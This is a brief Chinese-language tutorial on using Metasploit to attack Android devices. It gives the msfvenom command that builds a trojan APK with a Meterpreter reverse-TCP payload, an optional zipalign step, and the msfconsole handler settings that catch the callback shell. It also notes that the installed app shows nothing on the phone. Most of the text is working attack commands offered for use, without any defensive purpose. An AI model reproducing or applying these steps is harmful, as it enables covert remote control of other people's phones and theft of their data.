# Metasploit生成木马攻击Android设备

## 0X001 生成木马

 命令：`msfvenom -p android/meterpreter/reverse_tcp LHOST=10.203.87.64 LPORT=4444 R > /root/apk.apk`

解释：

LHOST=10.203.87.64 这个是配置接受反弹shell连接的主机IP  一般就是你kali本机IP

LPORT=4444 接受的端口

这两个要和exp模块里面的配置一样，一般就是本地

注：出现安装问题可以这样优化木马，没试过

 `zipalign -v 4 apk.apk  napk1.apk`

## 0X002 启动msfconsole

模块：`use exploit/multi/handler`

payload:  `set payload android/meterpreter/reverse_tcp`

参数IP\(和木马一致，一般是kali本机\)： `set LHOST 10.203.87.64`

参数端口\(和木马一致，不设置的话是4444\)：`set LPORT 4444`

`show options`一下看看有没有配置成功

`exploit`开始执行

这时在Android手机上（在同一子网下）安装，点击运行（啥反应都没有，后台也没有）、

当android上线后会有一个提示，大概就是这个样子

